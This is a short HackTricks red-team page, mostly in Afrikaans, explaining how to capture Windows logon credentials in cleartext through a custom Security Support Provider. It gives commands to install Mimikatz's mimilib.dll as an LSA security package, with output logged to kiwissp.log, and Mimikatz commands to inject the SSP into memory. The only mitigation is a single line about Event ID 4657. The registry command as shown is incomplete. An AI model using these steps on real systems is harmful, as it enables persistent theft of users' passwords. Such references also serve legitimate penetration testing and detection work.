# Custom SSP

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Custom SSP

[Leer wat 'n SSP (Security Support Provider) is hier.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **in te vang** in **duidelike teks** die **akkrediteerings** wat gebruik word om toegang tot die masjien te verkry.

#### Mimilib

Jy kan die `mimilib.dll` binêre gebruik wat deur Mimikatz verskaf word. **Dit sal alle akkrediteerings in duidelike teks in 'n lêer log.**\
Plaas die dll in `C:\Windows\System32\`\
Kry 'n lys van bestaande LSA Veiligheid Pakkette:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Voeg `mimilib.dll` by die Veiligheidsondersteuningsverskafferlys (Veiligheidspakkette):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
En na 'n herlaai kan alle akrediteerings in duidelike teks gevind word in `C:\Windows\System32\kiwissp.log`

#### In geheue

Jy kan dit ook direk in geheue inspuit met Mimikatz (let op dat dit 'n bietjie onstabiel/nie werkend kan wees):
```powershell
privilege::debug
misc::memssp
```
This won't survive reboots.

#### Mitigering

Event ID 4657 - Oudit skepping/wijziging van `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
